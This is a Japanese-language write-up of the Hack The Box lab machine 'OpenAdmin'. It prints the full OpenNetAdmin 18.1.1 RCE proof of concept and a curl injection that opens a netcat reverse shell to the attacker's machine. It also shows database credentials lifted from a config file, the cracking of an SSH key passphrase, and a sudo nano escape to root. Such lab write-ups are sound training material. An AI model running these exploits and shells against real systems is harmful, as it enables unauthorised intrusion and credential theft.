https://app.hackthebox.com/machines/OpenAdmin
## STEP 1
```sh
└─$ rustscan -a 10.129.5.45--scripts none
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
I scanned ports so fast, even my computer was surprised.

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.170.23:22
Open 10.129.170.23:80
10.129.170.23 -> [22,80]

```


## STEP 2
80番にアクセス、Apacheのデフォルトページっぽい  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/OpenAdmin_01.png" width="50%" height="50%">  
列挙、music/artwork を発見
```sh
└─$ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.5.45/FUZZ 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.5.45/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.hta                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 4592ms]
.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 4592ms]
.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 4593ms]
artwork                 [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 283ms]
index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 304ms]
music                   [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 299ms]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 291ms]
:: Progress: [4744/4744] :: Job [1/1] :: 141 req/sec :: Duration: [0:00:41] :: Errors: 0 ::
```
musicのログインページから、列挙で見つけれなかったサイトを発見  
OpenNetAdminというやつが使われているっぽい
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/OpenAdmin_02.png" width="75%" height="75%">  



## STEP 3
opennetadmin 18.1.1 には CVE-2019-25065 が存在しRCEの脆弱性がある  
searchsploitで、PoCを発見
```sh
└─$ searchsploit -m 47691
  Exploit: OpenNetAdmin 18.1.1 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/47691
     Path: /usr/share/exploitdb/exploits/php/webapps/47691.sh
    Codes: N/A
 Verified: False
File Type: ASCII text
Copied to: /home/kali/htb/47691.sh
```
PoCの使い方はURLを引数にする必要あり  
ただリバースシェルをとるのではなく毎度コマンドをRCEで実行しているぽい、手動でエクスプロイト
```sh
└─$ cat 47691.sh                                                   
# Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux

# Exploit Title: OpenNetAdmin v18.1.1 RCE
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux

#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```
PoCのcurlをぱくって、RCE
```sh
└─$ curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";busybox nc 10.10.14.70 4444 -e /bin/bash;echo \"END\"&xajaxargs[]=ping" http://10.129.5.45/ona/login.php 
^C
```
無事リバースシェル取得  
ユーザフラグすら権限拒否
```sh
└─$ rlwrap nc -lnvp 4444  
listening on [any] 4444 ...
connect to [10.10.14.70] from (UNKNOWN) [10.129.5.45] 32810

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)


tty
not a tty


python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@openadmin:/opt/ona/www$


www-data@openadmin:/opt/ona/www$ tty
tty
/dev/pts/1


www-data@openadmin:/opt/ona/www$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)


www-data@openadmin:/opt/ona/www$ ls -l /home
ls -l /home
total 8
drwxr-x--- 5 jimmy  jimmy  4096 Nov 22  2019 jimmy
drwxr-x--- 5 joanna joanna 4096 Jul 27  2021 joanna
```


## STEP 4
ffufで列挙した以外のwebサイトがあるっぽい
```sh
www-data@openadmin:/opt/ona$ ls /var/www/html
ls /var/www/html
artwork  index.html  marga  music  ona  sierra
```
他にもinternalフォルダがあるが、jimmyユーザ以外は確認できない
```sh
www-data@openadmin:/opt/ona$ ls -l /var/www/
ls -l /var/www/
total 8
drwxr-xr-x 6 www-data www-data 4096 Nov 22  2019 html
drwxrwx--- 2 jimmy    internal 4096 Nov 23  2019 internal
lrwxrwxrwx 1 www-data www-data   12 Nov 21  2019 ona -> /opt/ona/www
```
STEP2のonaのサイトを見たところ、dbとの接続がありそうなかんじ  
ona配下のディレクトリを探索するとdbのクレデンシャルを発見
```sh
www-data@openadmin:/opt/ona/www$ cat /var/www/html/ona/local/config/database_settings.inc.php
<www/html/ona/local/config/database_settings.inc.php
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```
パスワードの使いまわしをしてるかな  
してました、jimmyでログイン成功
```
www-data@openadmin:/opt/ona$ su jimmy
su jimmy
Password: n1nj4W4rri0R!

jimmy@openadmin:/opt/ona$ id
id
uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)
```
internalフォルダを確認
```sh
jimmy@openadmin:~$ ls -l /var/www/internal
ls -l /var/www/internal
total 12
-rwxrwxr-x 1 jimmy internal 3229 Nov 22  2019 index.php
-rwxrwxr-x 1 jimmy internal  185 Nov 23  2019 logout.php
-rwxrwxr-x 1 jimmy internal  339 Nov 23  2019 main.php
```
internalのwebサイトをブラウザ上で確認したい  
`/etc/apache2/sites-enabled/`配下のconfファイルで、各webサイトの設定を確認できる  
internalは、127.0.0.1の52846番でリスニングされているらしい
```sh
jimmy@openadmin:~$ cat /etc/apache2/sites-enabled/internal.conf
cat /etc/apache2/sites-enabled/internal.conf
Listen 127.0.0.1:52846

<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```
sshローカルポートフォワーディングで、kaliの52846番ポートとターゲットの52846番ポートを結ぶ
```sh
└─$ ssh jimmy@10.129.246.252 -L 52846:localhost:52846
The authenticity of host '10.129.246.252 (10.129.246.252)' can't be established.
ED25519 key fingerprint is SHA256:wrS/uECrHJqacx68XwnuvI9W+bbKl+rKdSh799gacqo.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.246.252' (ED25519) to the list of known hosts.
jimmy@10.129.246.252's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Jun  5 01:59:28 UTC 2025

  System load:  0.24              Processes:             179
  Usage of /:   30.8% of 7.81GB   Users logged in:       0
  Memory usage: 14%               IP address for ens160: 10.129.246.252
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

39 packages can be updated.
11 updates are security updates.


Last login: Thu Jan  2 20:50:03 2020 from 10.10.14.3
jimmy@openadmin:~$
```
52846番ポートアクセス成功  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/OpenAdmin_03.png" width="50%" height="50%">  
ログインページが表示された  
ログインページのソース、index.phpを確認
```php
jimmy@openadmin:~$ cat /var/www/internal/index.php
cat /var/www/internal/index.php
<?php
   ob_start();
   session_start();
?>

<?
   // error_reporting(E_ALL);
   // ini_set("display_errors", 1);
?>

<html lang = "en">

   <head>
      <title>Tutorialspoint.com</title>
      <link href = "css/bootstrap.min.css" rel = "stylesheet">

      <style>
         body {
            padding-top: 40px;
            padding-bottom: 40px;
            background-color: #ADABAB;
         }

         .form-signin {
            max-width: 330px;
            padding: 15px;
            margin: 0 auto;
            color: #017572;
         }

         .form-signin .form-signin-heading,
         .form-signin .checkbox {
            margin-bottom: 10px;
         }

         .form-signin .checkbox {
            font-weight: normal;
         }

         .form-signin .form-control {
            position: relative;
            height: auto;
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box;
            padding: 10px;
            font-size: 16px;
         }

         .form-signin .form-control:focus {
            z-index: 2;
         }

         .form-signin input[type="email"] {
            margin-bottom: -1px;
            border-bottom-right-radius: 0;
            border-bottom-left-radius: 0;
            border-color:#017572;
         }

         .form-signin input[type="password"] {
            margin-bottom: 10px;
            border-top-left-radius: 0;
            border-top-right-radius: 0;
            border-color:#017572;
         }

         h2{
            text-align: center;
            color: #017572;
         }
      </style>

   </head>
   <body>

      <h2>Enter Username and Password</h2>
      <div class = "container form-signin">
        <h2 class="featurette-heading">Login Restricted.<span class="text-muted"></span></h2>
          <?php
            $msg = '';

            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
                  $_SESSION['username'] = 'jimmy';
                  header("Location: /main.php");
              } else {
                  $msg = 'Wrong username or password.';
              }
            }
         ?>
      </div> <!-- /container -->

      <div class = "container">

         <form class = "form-signin" role = "form"
            action = "<?php echo htmlspecialchars($_SERVER['PHP_SELF']);
            ?>" method = "post">
            <h4 class = "form-signin-heading"><?php echo $msg; ?></h4>
            <input type = "text" class = "form-control"
               name = "username"
               required autofocus></br>
            <input type = "password" class = "form-control"
               name = "password" required>
            <button class = "btn btn-lg btn-primary btn-block" type = "submit"
               name = "login">Login</button>
         </form>

      </div>

   </body>
</html>
```
ユーザ名 jimmy のパスワードハッシュを確認することができた  
またクレデンシャルが正しい場合、main.phpにリダイレクトされるっぽい
```php
if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
  if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
      $_SESSION['username'] = 'jimmy';
      header("Location: /main.php");
```
main.phpを確認すると、ユーザ名 joanna のssh秘密鍵を表示するっぽい
```php
jimmy@openadmin:~$ cat /var/www/internal/main.php
cat /var/www/internal/main.php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```
sha512のハッシュ値をクラックすることができた、パスワードは Revealed  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/OpenAdmin_04.png" width="75%" height="75%">  
秘密鍵ゲット～  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/OpenAdmin_05.png" width="50%" height="50%">  
秘密鍵でsshログインしようとしたが、パスフレーズがいるもよう
```
└─$ chmod 0600 id_rsa 
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ ssh -i id_rsa joanna@10.129.246.252
Enter passphrase for key 'id_rsa':
```
`ssh2john`でパスフレーズのハッシュを抽出し、`hashcat`でクラック
パスフレーズは bloodninjas と判明
```sh
└─$ ssh2john id_rsa 
id_rsa:$sshng$1$16$2AF25344B8391A25A9B318F3FD767D6D$1200$906d14608706c9ac6ea6342a692d9ed47a9b87044b94d72d5b61df25e68a5235991f8bac883f40b539c829550ea5937c69dfd2b4c589f8c910e4c9c030982541e51b4717013fafbe1e1db9d6331c83cca061cc7550c0f4dd98da46ec1c7f460e4a135b6f1f04bafaf66a08db17ecad8a60f25a1a095d4f94a530f9f0bf9222c6736a5f54f1ff93c6182af4ad8a407044eb16ae6cd2a10c92acffa6095441ed63215b6126ed62de25b2803233cc3ea533d56b72d15a71b291547983bf5bee5b0966710f2b4edf264f0909d6f4c0f9cb372f4bb323715d17d5ded5f83117233976199c6d86bfc28421e217ccd883e7f0eecbc6f227fdc8dff12ca87a61207803dd47ef1f2f6769773f9cb52ea7bb34f96019e00531fcc267255da737ca3af49c88f73ed5f44e2afda28287fc6926660b8fb0267557780e53b407255dcb44899115c568089254d40963c8511f3492efe938a620bde879c953e67cfb55dbbf347ddd677792544c3bb11eb0843928a34d53c3e94fed25bff744544a69bc80c4ffc87ffd4d5c3ef5fd01c8b4114cacde7681ea9556f22fc863d07a0f1e96e099e749416cca147add636eb24f5082f9224e2907e3464d71ae711cf8a3f21bd4476bf98c633ff1bbebffb42d24544298c918a7b14c501d2c43534b8428d34d500537f0197e75a4279bbe4e8d2acee3c1586a59b28671e406c0e178b4d29aaa7a478b0258bde6628a3de723520a66fb0b31f1ea5bf45b693f868d47c2d89692920e2898ccd89710c42227d31293d9dad740791453ec8ebfb26047ccca53e0a200e9112f345f5559f8ded2f193feedd8c1db6bd0fbfa5441aa773dd5c4a60defe92e1b7d79182af16472872ab3c222bdd2b5f941604b7de582b08ce3f6635d83f66e9b84e6fe9d3eafa166f9e62a4cdc993d42ed8c0ad5713205a9fc7e5bc87b2feeaffe05167a27b04975e9366fa254adf511ffd7d07bc1f5075d70b2a7db06f2224692566fb5e8890c6e39038787873f21c52ce14e1e70e60b8fca716feb5d0727ac1c355cf633226c993ca2f16b95c59b3cc31ac7f641335d80ff1ad3e672f88609ec5a4532986e0567e169094189dcc82d11d46bf73bc6c48a05f84982aa222b4c0e78b18cceb15345116e74f5fbc55d407ed9ba12559f57f37512998565a54fe77ea2a2224abbddea75a1b6da09ae3ac043b6161809b630174603f33195827d14d0ebd64c6e48e0d0346b469d664f89e2ef0e4c28b6a64acdd3a0edf8a61915a246feb25e8e69b3710916e494d5f482bf6ab65c675f73c39b2c2eecdca6709188c6f36b6331953e3f93e27c987a3743eaa71502c43a807d8f91cdc4dc33f48b852efdc8fcc2647f2e588ae368d69998348f0bfcfe6d65892aebb86351825c2aa45afc2e6869987849d70cec46ba951c864accfb8476d5643e7926942ddd8f0f32c296662ba659e999b0fb0bbfde7ba2834e5ec931d576e4333d6b5e8960e9de46d32daa5360ce3d0d6b864d3324401c4975485f1aef6ba618edb12d679b0e861fe5549249962d08d25dc2dde517b23cf9a76dcf482530c9a34762f97361dd95352de4c82263cfaa90796c2fa33dd5ce1d889a045d587ef18a5b940a2880e1c706541e2b523572a8836d513f6e688444af86e2ba9ad2ded540deadd9559eb56ac66fe021c3f88c2a1a484d62d602903793d10d


└─$ ssh2john id_rsa | sed 's/^id_rsa://g' > id_rsa.txt

                                                                                                                                                                                                                                            
└─$ hashcat -a 0 -m 22931 id_rsa.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-skylake-avx512-11th Gen Intel(R) Core(TM) i7-1165G7 @ 2.80GHz, 2246/4556 MB (1024 MB allocatable), 2MCU

This hash-mode is known to emit multiple valid candidates for the same hash.
Use --keep-guessing to continue attack after finding the first crack.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$sshng$1$16$2af25344b8391a25a9b318f3fd767d6d$1200$906d14608706c9ac6ea6342a692d9ed47a9b87044b94d72d5b61df25e68a5235991f8bac883f40b539c829550ea5937c69dfd2b4c589f8c910e4c9c030982541e51b4717013fafbe1e1db9d6331c83cca061cc7550c0f4dd98da46ec1c7f460e4a135b6f1f04bafaf66a08db17ecad8a60f25a1a095d4f94a530f9f0bf9222c6736a5f54f1ff93c6182af4ad8a407044eb16ae6cd2a10c92acffa6095441ed63215b6126ed62de25b2803233cc3ea533d56b72d15a71b291547983bf5bee5b0966710f2b4edf264f0909d6f4c0f9cb372f4bb323715d17d5ded5f83117233976199c6d86bfc28421e217ccd883e7f0eecbc6f227fdc8dff12ca87a61207803dd47ef1f2f6769773f9cb52ea7bb34f96019e00531fcc267255da737ca3af49c88f73ed5f44e2afda28287fc6926660b8fb0267557780e53b407255dcb44899115c568089254d40963c8511f3492efe938a620bde879c953e67cfb55dbbf347ddd677792544c3bb11eb0843928a34d53c3e94fed25bff744544a69bc80c4ffc87ffd4d5c3ef5fd01c8b4114cacde7681ea9556f22fc863d07a0f1e96e099e749416cca147add636eb24f5082f9224e2907e3464d71ae711cf8a3f21bd4476bf98c633ff1bbebffb42d24544298c918a7b14c501d2c43534b8428d34d500537f0197e75a4279bbe4e8d2acee3c1586a59b28671e406c0e178b4d29aaa7a478b0258bde6628a3de723520a66fb0b31f1ea5bf45b693f868d47c2d89692920e2898ccd89710c42227d31293d9dad740791453ec8ebfb26047ccca53e0a200e9112f345f5559f8ded2f193feedd8c1db6bd0fbfa5441aa773dd5c4a60defe92e1b7d79182af16472872ab3c222bdd2b5f941604b7de582b08ce3f6635d83f66e9b84e6fe9d3eafa166f9e62a4cdc993d42ed8c0ad5713205a9fc7e5bc87b2feeaffe05167a27b04975e9366fa254adf511ffd7d07bc1f5075d70b2a7db06f2224692566fb5e8890c6e39038787873f21c52ce14e1e70e60b8fca716feb5d0727ac1c355cf633226c993ca2f16b95c59b3cc31ac7f641335d80ff1ad3e672f88609ec5a4532986e0567e169094189dcc82d11d46bf73bc6c48a05f84982aa222b4c0e78b18cceb15345116e74f5fbc55d407ed9ba12559f57f37512998565a54fe77ea2a2224abbddea75a1b6da09ae3ac043b6161809b630174603f33195827d14d0ebd64c6e48e0d0346b469d664f89e2ef0e4c28b6a64acdd3a0edf8a61915a246feb25e8e69b3710916e494d5f482bf6ab65c675f73c39b2c2eecdca6709188c6f36b6331953e3f93e27c987a3743eaa71502c43a807d8f91cdc4dc33f48b852efdc8fcc2647f2e588ae368d69998348f0bfcfe6d65892aebb86351825c2aa45afc2e6869987849d70cec46ba951c864accfb8476d5643e7926942ddd8f0f32c296662ba659e999b0fb0bbfde7ba2834e5ec931d576e4333d6b5e8960e9de46d32daa5360ce3d0d6b864d3324401c4975485f1aef6ba618edb12d679b0e861fe5549249962d08d25dc2dde517b23cf9a76dcf482530c9a34762f97361dd95352de4c82263cfaa90796c2fa33dd5ce1d889a045d587ef18a5b940a2880e1c706541e2b523572a8836d513f6e688444af86e2ba9ad2ded540deadd9559eb56ac66fe021c3f88c2a1a484d62d602903793d10d:bloodninjas
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 22931 (RSA/DSA/EC/OpenSSH Private Keys ($1, $3$))
Hash.Target......: $sshng$1$16$2af25344b8391a25a9b318f3fd767d6d$1200$9...93d10d
Time.Started.....: Thu Jun  5 00:02:28 2025 (4 secs)
Time.Estimated...: Thu Jun  5 00:02:32 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2643.7 kH/s (0.22ms) @ Accel:512 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 9576448/14344385 (66.76%)
Rejected.........: 0/9576448 (0.00%)
Restore.Point....: 9575424/14344385 (66.75%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: bloodythorn -> bloodgalz#7
Hardware.Mon.#1..: Util: 62%

Started: Thu Jun  5 00:02:18 2025
Stopped: Thu Jun  5 00:02:33 2025
```
`openssl`で秘密鍵のパスフレーズを解除してsshログイン成功！
ユーザフラグゲット！ルートフラグは権限拒否
```sh
└─$ openssl rsa -in id_rsa -out id_rsa_joanna
Enter pass phrase for id_rsa:
writing RSA key


└─$ ssh -i id_rsa_joannna joanna@10.129.246.252
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Jun  5 04:11:38 UTC 2025

  System load:  0.0               Processes:             183
  Usage of /:   30.9% of 7.81GB   Users logged in:       0
  Memory usage: 14%               IP address for ens160: 10.129.246.252
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

39 packages can be updated.
11 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Jul 27 06:12:07 2021 from 10.10.14.15

joanna@openadmin:~$ cat user.txt
82af7fd85bec5082d6ea0cf6b62f3929

joanna@openadmin:~$ ls /root
ls: cannot open directory '/root': Permission denied
```


## STEP 5
`/bin/nano /opt/priv`がパスワードなしで実行できる
```sh
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```
実行するとnanoが開いた、nano上でコマンド実行する  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/OpenAdmin_06.png" width="100%" height="100%">  
「Ctrl+r」からの「Ctrl+x」で次の画面、`reset; /bin/sh 1>&0 2>&0`をコマンド実行  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/OpenAdmin_07.png" width="100%" height="100%">  
すこし画面がバグるが、rootシェルを開くことができた  
ルートフラグゲット！  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/OpenAdmin_08.png" width="100%" height="100%">  
